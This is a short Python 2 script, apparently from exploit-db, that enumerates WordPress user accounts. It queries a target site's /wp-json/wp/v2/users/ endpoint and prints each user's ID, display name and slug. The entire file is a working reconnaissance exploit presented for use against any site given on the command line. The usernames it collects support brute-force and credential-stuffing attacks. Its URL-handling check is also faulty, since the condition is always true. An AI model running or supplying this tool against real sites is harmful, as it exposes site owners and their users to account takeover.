#!/usr/bin/env python 
# -*- coding:utf-8 -*-
# Coded by m@m@ {m4ll0k}

import json
from urlparse import urlparse
import urllib3
import sys 
import time

# ---------------------------------------------------------------------------

def banner():
	print "__  _  ________             ____   ____  __ __  _____   " 
	print "\ \/ \/ /\____ \   ______ _/ __ \ /    \|  |  \/     \  "
	print " \     / |  |_> > /_____/ \  ___/|   |  \  |  /  Y Y  \ "
	print "  \/\_/  |   __/           \___  >___|  /____/|__|_|  / "
	print "         |__|                  \/     \/            \/  "
	print "--------------------------------------------------------"
	print "   Wordpress Enumeration - Coded by m@m@ {m4ll0k}       "
	print "   https://www.exploit-db.com/exploits/41497/           "
	print "--------------------------------------------------------"
	print "Usage:\n\tpython wp_enum.py www.example.com           \n"

if len(sys.argv[1:]) < 1:
	banner()
	sys.exit()

# --------------------------------------------------------------------

class wp_enum:
	
	""" Wordpress Username Enumeration """

	def __init__(self, url):
		self.url = url
		self.results = ""
		self.path = "/wp-json/wp/v2/users/"
		self.data = []
		self.datares = ""
		self.name = []
		self.idd = []
		self.slug = []
		self.r = "\033[1;31m"
		self.t = "\033[0m"
		self.w = "\033[1;35m"

	def start(self):
		
		try:
			if '.' not in self.url:
				banner()
				sys.exit(0)
				# m@m@ 
			if 'http' or 'https' is not self.url:
				self.url = self.url
			elif 'http' or 'https' in self.url: 
				o = urlparse(self.url)
				self.url = o[1]
			else:
				pass
			con  = urllib3.PoolManager()
			req = con.request ('GET', self.url+self.path)
			self.data = json.loads(req.data, 'utf-8')
		except:
			print "\n[!] \"%s\" Not found \n"% sys.argv[1]
				
		if 'code' in self.data :
			print "[!] Not found username for \"%s\" :("% sys.argv[1]
			print ""

		elif self.data != []:
			try:			
				for x in range(len(self.data)):
					j =  self.data[x]['name']
					self.name.append(j)
			except Exception as err:
				print "Not found name..."
			try:
				for x in range(len(self.data)):
					d  = self.data[x]['id']
					self.idd.append(d)
			except  Exception as err:
				print "Not found id..."	
			try:
				for x in range(len(self.data)):
					g =  self.data[x]['slug']
					self.slug.append(g)
			except Exception as err:
				print "Not found slug..."
			try:
				banner()
				print "[*] Found Users for \"%s\": \n"% (sys.argv[1])
				for x in range(len(self.name)):
					print "[+] %sID:%s %s\t%sName:%s %s (%s)"% (self.r,self.t,self.idd[x],self.r,self.t, self.name[x],self.slug[x])
				print ""
			except:
				pass
		else:
			pass

def main(url):
	wp = wp_enum(url)
	wp.start()

if __name__ == "__main__":
	try:
		main(url=sys.argv[1])
	except KeyboardInterrupt as err:
		print "By Strunz...  :)"
		sys.exit(0)

	
